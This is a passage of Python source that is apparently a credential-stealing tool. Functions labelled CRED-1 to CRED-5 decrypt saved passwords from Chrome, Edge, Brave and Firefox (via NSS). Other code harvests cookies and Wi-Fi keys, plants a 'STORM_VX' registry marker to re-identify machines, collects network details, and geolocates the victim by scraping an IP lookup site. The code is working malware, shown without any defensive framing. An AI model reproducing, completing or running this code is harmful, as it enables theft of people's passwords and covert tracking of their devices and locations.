                pass
            except Exception:
                pass

            return "[LINUX_DECRYPT_FAILED]"

    except Exception:
        return "[DECRYPT_ERROR]"


def _read_chromium_db(db_path, browser_type="chrome", browser_name="Chrome"):
    """Read Chromium-based Login Data SQLite database (Chrome, Edge, Brave).
    v3: includes entries with empty usernames."""
    results = []
    try:
        import sqlite3
        import shutil, tempfile
        temp_db = os.path.join(tempfile.gettempdir(), f'{browser_name.lower()}_login_temp_{os.getpid()}.db')
        shutil.copy2(db_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')

        for row in cursor.fetchall():
            url = row[0] if row[0] else "N/A"
            username = row[1] if row[1] else ""
            encrypted_pw = row[2]

            if encrypted_pw:
                decrypted = _decrypt_chromium_password(encrypted_pw, browser_type)
            else:
                decrypted = "(empty)"

            # v3: include ALL entries, even with empty username
            results.append({
                "browser": browser_name,
                "url": url,
                "username": username if username else "(no username)",
                "password": decrypted
            })

        conn.close()
        try:
            os.remove(temp_db)
        except Exception:
            pass

    except Exception as e:
        results.append({
            "browser": browser_name,
            "url": "ERROR",
            "username": str(e),
            "password": ""
        })

    return results


def _find_chromium_profiles(base_path):
    """Find ALL profile directories containing Login Data.
    v4 FIX: Now scans EVERY subdirectory for Login Data, not just Default/Profile*.
    Previous version only checked dirs matching specific name patterns, which missed
    profiles with custom names (e.g. 'Guest Profile', 'Snapshots', etc.)."""
    paths = []
    if not os.path.isdir(base_path):
        return paths
    for d in os.listdir(base_path):
        full_dir = os.path.join(base_path, d)
        if not os.path.isdir(full_dir):
            continue
        # Check EVERY subdirectory for Login Data file
        profile_path = os.path.join(full_dir, 'Login Data')
        if os.path.exists(profile_path):
            paths.append(profile_path)
    return paths


def _harvest_chromium_all(base_path, browser_type, browser_name):
    """v3: Scan ALL Chromium profiles and combine results."""
    results = []
    
    # Scan all profiles found
    all_login_dbs = _find_chromium_profiles(base_path)
    
    # Also check Default explicitly (in case _find_chromium_profiles misses it)
    default_db = os.path.join(base_path, 'Default', 'Login Data')
    if os.path.exists(default_db) and default_db not in all_login_dbs:
        all_login_dbs.insert(0, default_db)
    
    # Sort: Default first, then Profile 1, Profile 2, etc.
    def sort_key(p):
        dirname = os.path.basename(os.path.dirname(p))
        if dirname == 'Default':
            return '0'
        return dirname
    all_login_dbs.sort(key=sort_key)
    
    for db_path in all_login_dbs:
        profile_name = os.path.basename(os.path.dirname(db_path))
        profile_results = _read_chromium_db(db_path, browser_type, browser_name)
        # Tag each result with the profile name
        for r in profile_results:
            r['profile'] = profile_name
        results.extend(profile_results)
    
    return results


def harvest_chrome_passwords():
    """[CRED-1] Extract saved passwords from Google Chrome.
    v3: scans ALL profiles (Default, Profile 1, Profile 2, etc.)."""
    if IS_WINDOWS:
        base = os.path.join(os.environ.get('LOCALAPPDATA', ''),
                           'Google', 'Chrome', 'User Data')
    else:
        base = os.path.expanduser('~/.config/google-chrome')

    if not os.path.isdir(base):
        return [{"browser": "Chrome", "info": "Chrome User Data not found"}]

    return _harvest_chromium_all(base, "chrome", "Chrome")


def harvest_chrome_cookies():
    """[CRED-2] Extract cookies from Google Chrome (names and domains only)."""
    results = []

    if IS_WINDOWS:
        db_path = os.path.join(
            os.environ.get('LOCALAPPDATA', ''),
            'Google', 'Chrome', 'User Data', 'Default', 'Cookies'
        )
    else:
        db_path = os.path.expanduser('~/.config/google-chrome/Default/Cookies')

    if not os.path.exists(db_path):
        return [{"browser": "Chrome", "info": "Cookie database not found"}]

    try:
        import sqlite3, shutil, tempfile
        temp_db = os.path.join(tempfile.gettempdir(), 'chrome_cookies_temp.db')
        shutil.copy2(db_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        # Try new schema first (encrypted_value), fallback to old
        try:
            cursor.execute('SELECT host_key, name, path, expires_utc, is_secure, is_httponly FROM cookies LIMIT 200')
        except Exception:
            cursor.execute('SELECT host_key, name, path, expires_utc, is_secure FROM cookies LIMIT 200')

        for row in cursor.fetchall():
            results.append({
                "browser": "Chrome",
                "domain": row[0],
                "name": row[1],
                "path": row[2],
                "expires": row[3],
                "secure": bool(row[4])
            })

        conn.close()
        try:
            os.remove(temp_db)
        except Exception:
            pass

    except Exception as e:
        results.append({"browser": "Chrome", "error": str(e)})

    return results


# ═══════════════════════════════════════════════════════════════════════════════
# FIREFOX NSS DECRYPTION — Using ctypes to load nss3 library
# ═══════════════════════════════════════════════════════════════════════════════

def _try_firefox_nss_decrypt(profile_path, enc_data_b64):
    """
    Decrypt Firefox login data using NSS library via ctypes.
    Firefox uses PK11SDR_Decrypt from nss3.dll / libnss3.so.
    """
    import ctypes
    import ctypes.util

    try:
        raw_data = base64.b64decode(enc_data_b64)
    except Exception:
        return None

    # Find NSS library
    nss3_path = None
    if IS_WINDOWS:
        ff_dirs = [
            os.path.join(os.environ.get('PROGRAMFILES', 'C:\\Program Files'), 'Mozilla Firefox'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)', 'C:\\Program Files (x86)'), 'Mozilla Firefox'),
        ]
        for d in ff_dirs:
            p = os.path.join(d, 'nss3.dll')
            if os.path.exists(p):
                nss3_path = p
                break
    else:
        lib_paths = [
            '/usr/lib/x86_64-linux-gnu/libnss3.so',
            '/usr/lib/libnss3.so',
            '/usr/lib64/libnss3.so',
        ]
        for p in lib_paths:
            if os.path.exists(p):
                nss3_path = p
                break
        if not nss3_path:
            lib_path = ctypes.util.find_library('nss3')
            if lib_path:
                nss3_path = lib_path

    if not nss3_path:
        return None

    try:
        if IS_WINDOWS and os.path.dirname(nss3_path) not in os.environ.get('PATH', ''):
            os.environ['PATH'] = os.path.dirname(nss3_path) + ';' + os.environ.get('PATH', '')
        nss = ctypes.cdll.LoadLibrary(nss3_path)
    except Exception:
        return None

    # SECItem structure for NSS
    class SECItem(ctypes.Structure):
        _fields_ = [
            ("type", ctypes.c_uint),
            ("data", ctypes.POINTER(ctypes.c_ubyte)),
            ("len", ctypes.c_uint),
        ]

    try:
        # Initialize NSS with the profile directory
        nss.NSS_Init.argtypes = [ctypes.c_char_p]
        nss.NSS_Init.restype = ctypes.c_int
        nss.NSS_Shutdown.argtypes = []
        nss.NSS_Shutdown.restype = ctypes.c_int

        profile_bytes = profile_path.encode('utf-8') if isinstance(profile_path, str) else profile_path
        init_result = nss.NSS_Init(profile_bytes)
        if init_result != 0:
            # Try with "sql:" prefix (newer Firefox uses SQL cipher)
            init_result = nss.NSS_Init(b"sql:" + profile_bytes)
            if init_result != 0:
                return None

        # Set up PK11SDR_Decrypt
        nss.PK11SDR_Decrypt.argtypes = [ctypes.POINTER(SECItem), ctypes.POINTER(SECItem), ctypes.c_void_p]
        nss.PK11SDR_Decrypt.restype = ctypes.c_int

        # Input
        enc_buf = (ctypes.c_ubyte * len(raw_data))(*raw_data)
        input_item = SECItem()
        input_item.type = 0  # siBuffer
        input_item.data = ctypes.cast(enc_buf, ctypes.POINTER(ctypes.c_ubyte))
        input_item.len = len(raw_data)

        # Output
        output_item = SECItem()
        output_item.type = 0
        output_item.data = None
        output_item.len = 0

        # Decrypt
        result = nss.PK11SDR_Decrypt(ctypes.byref(input_item), ctypes.byref(output_item), None)

        decrypted = None
        if result == 0 and output_item.data and output_item.len > 0:
            decrypted = ctypes.string_at(output_item.data, output_item.len).decode('utf-8', errors='replace')

        nss.NSS_Shutdown()
        return decrypted

    except Exception:
        try:
            nss.NSS_Shutdown()
        except Exception:
            pass
        return None


def _try_firefox_dpapi_decrypt(enc_data_b64):
    """Try Windows DPAPI for Firefox decryption (older versions)."""
    if not IS_WINDOWS:
        return None
    try:
        import win32crypt
        raw = base64.b64decode(enc_data_b64)
        dec = win32crypt.CryptUnprotectData(raw, None, None, None, 0)[1]
        return dec.decode('utf-8', errors='replace')
    except Exception:
        return None


def harvest_firefox_passwords():
    """[CRED-3] Extract saved passwords from Mozilla Firefox with NSS decryption."""
    results = []

    if IS_WINDOWS:
        profile_dir = os.path.join(
            os.environ.get('APPDATA', ''),
            'Mozilla', 'Firefox', 'Profiles'
        )
    else:
        profile_dir = os.path.expanduser('~/.mozilla/firefox')

    if not os.path.isdir(profile_dir):
        return [{"browser": "Firefox", "info": "Profile directory not found"}]

    # Find all Firefox profiles (prioritize default-release)
    profiles = []
    for d in os.listdir(profile_dir):
        full = os.path.join(profile_dir, d)
        if os.path.isdir(full) and (d.endswith('.default-release') or d.endswith('.default') or d.endswith('.esr')):
            profiles.append(full)

    if not profiles:
        for d in os.listdir(profile_dir):
            full = os.path.join(profile_dir, d)
            if os.path.isdir(full):
                profiles.append(full)

    for profile in profiles[:5]:
        logins_path = os.path.join(profile, 'logins.json')
        key4_path = os.path.join(profile, 'key4.db')

        if not os.path.exists(logins_path):
            continue

        has_key4 = os.path.exists(key4_path)

        try:
            with open(logins_path, 'r', encoding='utf-8') as f:
                logins_data = json.load(f)

            if 'logins' not in logins_data:
                continue

            # Test if NSS decryption works for this profile
            nss_works = False
            if has_key4:
                try:
                    test_result = _try_firefox_nss_decrypt(profile, "dGVzdA==")
                    # Even if decryption fails for test data, NSS init might work
                    nss_works = True
                except Exception:
                    nss_works = False

            for login in logins_data['logins']:
                url = login.get('hostname', 'N/A')
                enc_username = login.get('encryptedUsername', '')
                enc_password = login.get('encryptedPassword', '')
                plain_username = login.get('username', '')

                decrypted_pw = None
                decrypted_user = None

                # Strategy 1: NSS decryption via ctypes (best approach)
                if has_key4 and nss_works and enc_password:
                    try:
                        dec = _try_firefox_nss_decrypt(profile, enc_password)
                        if dec:
                            decrypted_pw = dec
                    except Exception:
                        pass
                    if enc_username:
                        try:
                            dec = _try_firefox_nss_decrypt(profile, enc_username)
                            if dec:
                                decrypted_user = dec
                        except Exception:
                            pass

                # Strategy 2: Windows DPAPI (older Firefox)
                if decrypted_pw is None and IS_WINDOWS and enc_password:
                    try:
                        dec = _try_firefox_dpapi_decrypt(enc_password)
                        if dec:
                            decrypted_pw = dec
                    except Exception:
                        pass
                    if enc_username and decrypted_user is None:
                        try:
                            dec = _try_firefox_dpapi_decrypt(enc_username)
                            if dec:
                                decrypted_user = dec
                        except Exception:
                            pass

                # Use plaintext username if available
                if plain_username:
                    decrypted_user = plain_username

                # Fallback markers
                if decrypted_pw is None:
                    if not has_key4:
                        decrypted_pw = "[NO_KEY4_DB]"
                    elif not nss_works:
                        decrypted_pw = "[NSS_NOT_AVAILABLE]"
                    else:
                        decrypted_pw = "[NSS_ENCRYPTED]"
                if decrypted_user is None:
                    decrypted_user = "[ENCRYPTED]"

                results.append({
                    "browser": "Firefox",
                    "profile": os.path.basename(profile),
                    "url": url,
                    "username": decrypted_user,
                    "password": decrypted_pw,
                    "enc_available": bool(enc_password)
                })

        except Exception as e:
            results.append({
                "browser": "Firefox",
                "profile": os.path.basename(profile),
                "url": "ERROR",
                "username": str(e),
                "password": ""
            })

    return results


def harvest_edge_passwords():
    """[CRED-4] Extract saved passwords from Microsoft Edge (Chromium-based).
    v3: scans ALL profiles."""
    if IS_WINDOWS:
        base = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data')
    else:
        base = os.path.expanduser('~/.config/microsoft-edge')

    if not os.path.isdir(base):
        return [{"browser": "Edge", "info": "Edge User Data not found"}]

    return _harvest_chromium_all(base, "edge", "Edge")


def harvest_brave_passwords():
    """[CRED-4b] Extract saved passwords from Brave Browser (Chromium-based).
    v3: scans ALL profiles."""
    if IS_WINDOWS:
        base = os.path.join(os.environ.get('LOCALAPPDATA', ''),
                           'BraveSoftware', 'Brave-Browser', 'User Data')
    else:
        base = os.path.expanduser('~/.config/BraveSoftware/Brave-Browser')

    if not os.path.isdir(base):
        return [{"browser": "Brave", "info": "Brave User Data not found"}]

    return _harvest_chromium_all(base, "brave", "Brave")


def harvest_all_credentials():
    """[CRED-5] Master function: Harvest credentials from all browsers.
    v4: includes diagnostic info for Chrome decryption troubleshooting."""
    all_creds = {
        "chrome_passwords": [],
        "chrome_cookies_count": 0,
        "firefox_passwords": [],
        "edge_passwords": [],
        "brave_passwords": [],
        "summary": {},
        "decryption_diagnostics": {}
    }

    # Chrome passwords
    try:
        chrome_pw = harvest_chrome_passwords()
        all_creds["chrome_passwords"] = chrome_pw[:100]
        all_creds["summary"]["chrome_passwords"] = len(chrome_pw)
        # Count encryption types
        v10_count = sum(1 for p in chrome_pw if 'v10' in p.get('password', ''))
        v11_count = sum(1 for p in chrome_pw if 'v11' in p.get('password', ''))
        v20_count = sum(1 for p in chrome_pw if 'v20' in p.get('password', '') or 'APP_BOUND' in p.get('password', ''))
        decrypt_ok = sum(1 for p in chrome_pw if not p.get('password', '').startswith('['))
        all_creds["summary"]["chrome_decrypted"] = decrypt_ok
        all_creds["summary"]["chrome_v10_encrypted"] = v10_count
        all_creds["summary"]["chrome_v11_encrypted"] = v11_count
        all_creds["summary"]["chrome_v20_encrypted"] = v20_count
    except Exception as e:
        all_creds["summary"]["chrome_error"] = str(e)

    # Chrome cookies (count only to keep data small)
    try:
        chrome_cookies = harvest_chrome_cookies()
        all_creds["chrome_cookies_count"] = len(chrome_cookies)
        all_creds["summary"]["chrome_cookies"] = len(chrome_cookies)
        interesting = [c for c in chrome_cookies if not c.get('domain', '').startswith('.')][:50]
        all_creds["chrome_cookies_sample"] = interesting
    except Exception as e:
        all_creds["summary"]["chrome_cookies_error"] = str(e)

    # Firefox passwords
    try:
        ff_pw = harvest_firefox_passwords()
        all_creds["firefox_passwords"] = ff_pw[:100]
        all_creds["summary"]["firefox_passwords"] = len(ff_pw)
        # Count successfully decrypted Firefox passwords
        ff_decrypted = sum(1 for p in ff_pw if not p.get('password', '').startswith('['))
        all_creds["summary"]["firefox_decrypted"] = ff_decrypted
    except Exception as e:
        all_creds["summary"]["firefox_error"] = str(e)

    # Edge passwords
    try:
        edge_pw = harvest_edge_passwords()
        all_creds["edge_passwords"] = edge_pw[:100]
        all_creds["summary"]["edge_passwords"] = len(edge_pw)
    except Exception as e:
        all_creds["summary"]["edge_error"] = str(e)

    # Brave passwords
    try:
        brave_pw = harvest_brave_passwords()
        all_creds["brave_passwords"] = brave_pw[:100]
        all_creds["summary"]["brave_passwords"] = len(brave_pw)
    except Exception as e:
        all_creds["summary"]["brave_error"] = str(e)

    # Include decryption diagnostics
    all_creds["decryption_diagnostics"] = dict(_chrome_diag)

    return all_creds



# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 3 (CONT): MACHINE ID & REGISTRY MARKER
# ═══════════════════════════════════════════════════════════════════════════════

def generate_machine_id(hwid):
    """[MID-1] Generate a short Machine ID for quick identification."""
    return hashlib.md5(hwid.encode('utf-8')).hexdigest()[:16].upper()


def save_registry_marker(machine_id):
    """[MID-2] Save a marker in Windows Registry for re-identification."""
    if not IS_WINDOWS:
        return False, "N/A (Windows only)"
    try:
        result = subprocess.run(
            ['reg', 'add', 'HKLM\\SOFTWARE\\STORM_VX',
             '/v', 'MachineID', '/t', 'REG_SZ', '/d', machine_id, '/f'],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            return True, "Marker saved"
        return False, "Failed (needs Admin)"
    except Exception as e:
        return False, str(e)


def check_existing_marker():
    """[MID-3] Check if this machine was already tracked before."""
    if not IS_WINDOWS:
        return None, "N/A"
    try:
        result = subprocess.run(
            ['reg', 'query', 'HKLM\\SOFTWARE\\STORM_VX', '/v', 'MachineID'],
            capture_output=True, text=True, timeout=3
        )
        match = re.search(r'REG_SZ\s+(\S+)', result.stdout)
        if match:
            return match.group(1), "Previously tracked"
        return None, "First time"
    except Exception:
        return None, "First time (or access denied)"


def generate_maps_link(lat, lon):
    """[MID-4] Generate Google Maps link from coordinates."""
    if lat and lon and lat not in ("Unknown", "\u0646\u0627\u0645\u0634\u062e\u0635") and lon not in ("Unknown", "\u0646\u0627\u0645\u0634\u062e\u0635"):
        return f"https://www.google.com/maps?q={lat},{lon}"
    return "N/A"


# ═══════════════════════════════════════════════════════════════════════════════
# ORIGINAL FUNCTIONS (kept from v1)
# ═══════════════════════════════════════════════════════════════════════════════

def is_admin():
    try:
        if IS_WINDOWS:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except Exception:
        return False


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "Error"


def get_mac_address():
    mac = uuid.getnode()
    return ":".join([f"{(mac >> elements) & 0xff:02x}" for elements in range(0, 8*6, 8)][::-1])


def get_os_info():
    os_name = platform.system()
    os_release = platform.release()
    os_version = platform.version()
    processor = platform.processor()
    arch = platform.machine()
    os_str = f"{os_name} {os_release} ({arch})"
    cpu_str = f"{processor if processor else 'Unknown'}"
    return os_str, cpu_str


def get_system_uptime():
    try:
        if IS_WINDOWS:
            result = subprocess.run(['wmic', 'os', 'get', 'LastBootUpTime'],
                                    capture_output=True, text=True, timeout=5)
            lines = [l.strip() for l in result.stdout.split('\n') if l.strip()]
            if len(lines) > 1:
                boot_time_str = lines[1]
                if boot_time_str:
                    return f"{boot_time_str[0:4]}/{boot_time_str[4:6]}/{boot_time_str[6:8]} - {boot_time_str[8:10]}:{boot_time_str[10:12]}"
        else:
            result = subprocess.run(['uptime', '-s'], capture_output=True, text=True, timeout=5)
            if result.stdout.strip():
                return result.stdout.strip()
        return "Not supported on this OS"
    except Exception:
        return "Error retrieving"


def get_hardware_resources():
    info = {}
    try:
        if IS_WINDOWS:
            mem_cmd = subprocess.run(['wmic', 'OS', 'get', 'TotalVisibleMemorySize,FreePhysicalMemory'],
                                     capture_output=True, text=True, timeout=5)
            mem_lines = [l.strip() for l in mem_cmd.stdout.split('\n')
                         if l.strip() and 'TotalVisible' not in l]
            if mem_lines:
                parts = mem_lines[0].split()
                if len(parts) >= 2:
                    info['RAM'] = f"Total: {int(parts[0])/1024:.1f} GB | Free: {int(parts[1])/1024:.1f} GB"
            disk_cmd = subprocess.run(['wmic', 'logicaldisk', 'get', 'size,freespace,caption'],
                                      capture_output=True, text=True, timeout=5)
            for line in disk_cmd.stdout.split('\n'):
                if 'C:' in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        info['Disk C:'] = f"Total: {int(parts[2])/(1024**3):.1f} GB | Free: {int(parts[1])/(1024**3):.1f} GB"
                        break
        else:
            try:
                with open('/proc/meminfo', 'r') as f:
                    meminfo = {}
                    for line in f:
                        parts = line.split()
                        if len(parts) >= 2:
                            meminfo[parts[0].rstrip(':')] = int(parts[1])
                    total = meminfo.get('MemTotal', 0) / 1024
                    free = meminfo.get('MemAvailable', meminfo.get('MemFree', 0)) / 1024
                    info['RAM'] = f"Total: {total:.1f} GB | Free: {free:.1f} GB"
            except Exception:
                pass
        return info if info else {"Status": "No information found"}
    except Exception:
        return {"Error": "Failed to retrieve hardware info"}


def get_default_gateway():
    try:
        if IS_WINDOWS:
            result = subprocess.run(['ipconfig'], capture_output=True, text=True,
                                    timeout=5, encoding='utf-8')
            match = re.search(r'Default Gateway\.+:\s*([\d\.]+)', result.stdout)
            return match.group(1) if match else "Not found"
        else:
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=5)
            match = re.search(r'default via ([\d\.]+)', result.stdout)
            return match.group(1) if match else "Not found"
    except Exception:
        return "Error"


def get_active_connections():
    try:
        command = 'netstat -ano' if IS_WINDOWS else 'ss -tulpn'
        result = subprocess.run(command, shell=True, capture_output=True, text=True,
                                timeout=5, encoding='utf-8')
        established = [line.strip() for line in result.stdout.split('\n')
                       if 'ESTABLISHED' in line]
        return established[:5]
    except Exception:
        return ["Error retrieving connections"]


def get_arp_table():
    try:
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True,
                                timeout=5, encoding='utf-8')
        devices = [line.strip() for line in result.stdout.split('\n')
                   if re.search(r'\d+\.\d+\.\d+\.\d+', line)]
        return devices[:5]
    except Exception:
        return ["ARP access blocked"]


def get_firewall_status():
    if not IS_WINDOWS:
        return ["Only supported on Windows"]
    try:
        result = subprocess.run(['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
                                capture_output=True, text=True, timeout=5, encoding='utf-8')
        profiles = [line.strip() for line in result.stdout.split('\n')
                    if 'ON' in line or 'OFF' in line]
        return profiles if profiles else ["Error retrieving"]
    except Exception:
        return ["Requires Admin access"]


def get_wifi_passwords():
    if not IS_WINDOWS:
        return [("Non-Windows OS", "This feature is only supported on Windows")]
    wifi_list = []
    try:
        profiles_cmd = subprocess.run(['netsh', 'wlan', 'show', 'profiles'],
                                       capture_output=True, text=True, timeout=5,
                                       encoding='utf-8', errors='replace')
        profile_names = re.findall(r':\s+(.+)\s*$', profiles_cmd.stdout, re.MULTILINE)
        for name in profile_names:
            detail_cmd = subprocess.run(['netsh', 'wlan', 'show', 'profile',
                                          f'name={name}', 'key=clear'],
                                         capture_output=True, text=True, timeout=5,
                                         encoding='utf-8', errors='replace')
            password_match = re.search(r'\u0645\u062d\u062a\u0648\u0627\u06cc \u06a9\u0644\u06cc\u062f\s*:\s*(.+)\s*$',
                                       detail_cmd.stdout, re.MULTILINE)
            if not password_match:
                password_match = re.search(r'Key Content\s*:\s*(.+)\s*$',
                                           detail_cmd.stdout, re.MULTILINE)
            password = password_match.group(1) if password_match else "(No access / Open)"
            wifi_list.append((name.strip(), password.strip()))
    except Exception as e:
        return [("Error", str(e))]
    return wifi_list


def get_info_from_numberia():
    """
    Public IP & geolocation from ipnumberia.com.
    Supports both English and Persian labels (Farsi).
    Uses multi-strategy coordinate extraction to handle any page format.
    """
    url = "https://ipnumberia.com/"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                       '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    req = urllib.request.Request(url, headers=headers)
    ctx = ssl._create_unverified_context()

    public_ip = "\u06cc\u0627\u0641\u062a \u0646\u0634\u062f"     # یافت نشد
    isp = "\u0646\u0627\u0645\u0634\u062e\u0635"                   # نامشخص
    country = "\u0646\u0627\u0645\u0634\u062e\u0635"               # نامشخص
    city = "\u0646\u0627\u0645\u0634\u062e\u0635"                   # نامشخص
    coords = "\u0646\u0627\u0645\u0634\u062e\u0635"                 # نامشخص

    try:
        response = urllib.request.urlopen(req, timeout=2, context=ctx)
        html = response.read().decode('utf-8')

        # ─── 1. Find Public IP ───
        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', html)
        if ip_match:
            public_ip = ip_match.group(0)

            # ─── 2. Context window around IP (for country, city, ISP) ───
            start = max(0, ip_match.start() - 2000)
            end = min(len(html), ip_match.end() + 2000)
            context_html = html[start:end]

            # Clean HTML tags in context slice
            clean_text = re.sub(r'<[^>]+>', ' ', context_html)
            clean_text = re.sub(r'\s+', ' ', clean_text)

            # ─── 3. Extract Country (English + Persian labels) ───
            c_match = re.search(
                r'(?:\u06a9\u0634\u0648\u0631|Country)\s*:?\s*([^\s,<]{2,30})',
                clean_text, re.IGNORECASE)
            if c_match:
                country = c_match.group(1)

            # ─── 4. Extract City (English + Persian labels) ───
            city_match = re.search(
                r'(?:\u0634\u0647\u0631|City|\u0627\u0633\u062a\u0627\u0646|Province)\s*:?\s*([^\s,<]{2,30})',
                clean_text, re.IGNORECASE)
            if city_match:
                city = city_match.group(1)

            # ─── 5. Extract Coordinates — Multi-Strategy ───
            # Also clean the FULL page for coordinate search (coords might be far from IP)
            full_clean = re.sub(r'<[^>]+>', ' ', html)
            full_clean = re.sub(r'\s+', ' ', full_clean)

            coords = _extract_coordinates(clean_text, full_clean)

            # ─── 6. Extract ISP (English + Persian labels) ───
            # ipnumberia uses various labels: ISP, ارائه دهنده, سرویس دهنده,
            # شرکت, اپراتور, Provider, Organization, ASN
            isp_patterns = [
                # Table-row format: label ... value (with possible HTML remnants)
                r'(?:ISP|Provider|Organization|ASN|Network)\s*.*?([\w\u0600-\u06FF\s\-\.&]{3,60})',
                r'(?:\u0627\u0631\u0627\u0626\u0647\s?\u062f\u0647\u0646\u062f\u0647|'  # ارائه دهنده
                r'\u0633\u0631\u0648\u06cc\u0633\s?\u062f\u0647\u0646\u062f\u0647|'      # سرویس دهنده
                r'\u0634\u0631\u06a9\u062a|'                                              # شرکت
                r'\u0627\u067e\u0631\u0627\u062a\u0648\u0631|'                            # اپراتور
                r'\u0634\u0628\u06a9\u0647)'                                              # شبکه
                r'\s*.*?([\w\u0600-\u06FF\s\-\.&]{3,60})',
            ]
            for pat in isp_patterns:
                isp_match = re.search(pat, clean_text, re.IGNORECASE)
                if isp_match:
                    candidate = isp_match.group(1).strip()
                    # Filter out non-ISP matches (too short or looks like HTML)
                    if len(candidate) >= 3 and '<' not in candidate:
                        isp = candidate
                        break

            # Fallback: keyword matching (Persian + English)
            if isp == "\u0646\u0627\u0645\u0634\u062e\u0635":  # نامشخص
                isp_keywords = [
                    '\u0627\u06cc\u0631\u0627\u0646\u0633\u0644',     # ایرانسل
                    '\u0645\u062e\u0627\u0628\u0631\u0627\u062a',     # مخابرات
                    '\u0634\u0627\u062a\u0644',                       # شاتل
                    '\u0631\u0627\u06cc\u062a\u0644',                 # رایتل
                    '\u0632\u06cc\u0631\u0633\u0627\u062e\u062a',     # زیرساخت
                    '\u067e\u0627\u0631\u0633 \u0622\u0646\u0644\u0627\u06cc\u0646',  # پارس آنلاین
                    '\u0647\u0627\u06cc\u200c\u0648\u0628',           # های‌وب
                    '\u0627\u0641\u0631\u0627\u0646\u062a',           # افرانت
                    'Irancell', 'Mokhaberat', 'Shatel', 'Rightel',
                    'Pars Online', 'HiWeb', 'Afranet', 'Iran Cell',
                    'ADATA', 'Mobile Communication', 'TP', 'MCI',
                    'Telecommunication', 'Infrastructure'
                ]
                for kw in isp_keywords:
                    if kw.lower() in clean_text.lower():
                        isp = kw
                        break

        return public_ip, isp, country, city, coords

    except Exception as e:
        return public_ip, str(e), "\u062e\u0637\u0627", "\u062e\u0637\u0627", "\u062e\u0637\u0627"


def _extract_coordinates(context_text, full_text):
    """
    Extract geographic coordinates from ipnumberia.com text using multiple strategies.

    ipnumberia.com puts latitude and longitude in SEPARATE table rows:
      <tr><th>عرض جغرافیایی</th><td>35.689234</td></tr>
      <tr><th>طول جغرافیایی</th><td>51.389056</td></tr>

    Strategy 0: Separate-row table extraction (ipnumberia-specific)
    Strategy 1: Labeled patterns (Lat/Lon keywords in English/Persian on same line)
    Strategy 2: Simple decimal pairs (comma or space separated, with optional degree)
    Strategy 3: Smart pair detection (find two decimals that look like coordinates)
    Strategy 4: Concatenated numbers detection
    """
    # Search in both context and full page
    search_texts = [context_text, full_text]

    for text in search_texts:
        # ─── Strategy 0: Separate-row extraction (ipnumberia.com format) ───
        # Persian: عرض جغرافیایی / عرض‌جغرافیایی (with ZWNJ) ... 35.689234
        lat_match = re.search(
            r'(?:\u0639\u0631\u0636[\s\u200c]*\u062c\u063a\u0631\u0627\u0641\u06cc[\s\u200c]*\u0627\u06cc\u06cc|'
            r'\u0639\u0631\u0636[\s\u200c]*\u062c\u063a\u0631\u0627\u0641\u06cc|'
            r'Latitude|Lat)\s*.*?(-?\d{1,3}\.\d+)',
            text, re.IGNORECASE)
        lon_match = re.search(
            r'(?:\u0637\u0648\u0644[\s\u200c]*\u062c\u063a\u0631\u0627\u0641\u06cc[\s\u200c]*\u0627\u06cc\u06cc|'
            r'\u0637\u0648\u0644[\s\u200c]*\u062c\u063a\u0631\u0627\u0641\u06cc|'
            r'Longitude|Lon|Lng)\s*.*?(-?\d{1,3}\.\d+)',
            text, re.IGNORECASE)
        if lat_match and lon_match:
            lat_val = lat_match.group(1)
            lon_val = lon_match.group(1)
            # Validate: latitude should be -90 to 90, longitude -180 to 180
            try:
                lat_f = float(lat_val)
                lon_f = float(lon_val)
                if -90 <= lat_f <= 90 and -180 <= lon_f <= 180:
                    return f"{lat_val}, {lon_val}"
            except ValueError:
                pass

        # ─── Strategy 1: Labeled coordinates on same line ───
        labeled_patterns = [
            # English: Latitude: X, Longitude: Y
            r'(?:Latitude|Lat)\s*[:：]?\s*(-?\d{1,3}\.\d+)\s*[°]?\s*.{0,15}?(?:Longitude|Lon|Lng)\s*[:：]?\s*(-?\d{1,3}\.\d+)',
            # Coordinates label
            r'(?:Coordinates?|\u0645\u062e\u062a\u0635\u0627\u062a|\u0645\u0648\u0642\u0639\u06cc\u062a)\s*[:：]?\s*(-?\d{1,3}\.\d+)\s*[°]?\s*[,،\s]\s*(-?\d{1,3}\.\d+)',
        ]
        for pat in labeled_patterns:
            m = re.search(pat, text, re.IGNORECASE)
            if m:
                return f"{m.group(1)}, {m.group(2)}"

        # ─── Strategy 2: Decimal pair with comma/space separator ───
        pair_patterns = [
            r'(-?\d{2}\.\d+)\s*[°]?\s*[,،]\s*(-?\d{2,3}\.\d+)',         # Comma separated
            r'(-?\d{2}\.\d+)\s*[°]?\s+[NS]\s*[,،]?\s*(-?\d{2,3}\.\d+)', # N/S, then E/W
        ]
        for pat in pair_patterns:
            m = re.search(pat, text)
            if m:
                return f"{m.group(1)}, {m.group(2)}"

        # ─── Strategy 3: Smart pair detection ───
        all_decimals = re.findall(r'(-?\d{1,3}\.\d{1,6})', text)
        for i in range(len(all_decimals) - 1):
            try:
                val1 = float(all_decimals[i])
                val2 = float(all_decimals[i + 1])
                # Iran-specific range (most common use case)
                if 24 <= val1 <= 42 and 43 <= val2 <= 64:
                    return f"{all_decimals[i]}, {all_decimals[i+1]}"
                # Global range
                if -90 <= val1 <= 90 and -180 <= val2 <= 180 and abs(val2 - val1) > 3:
                    return f"{all_decimals[i]}, {all_decimals[i+1]}"
            except (ValueError, IndexError):
                pass

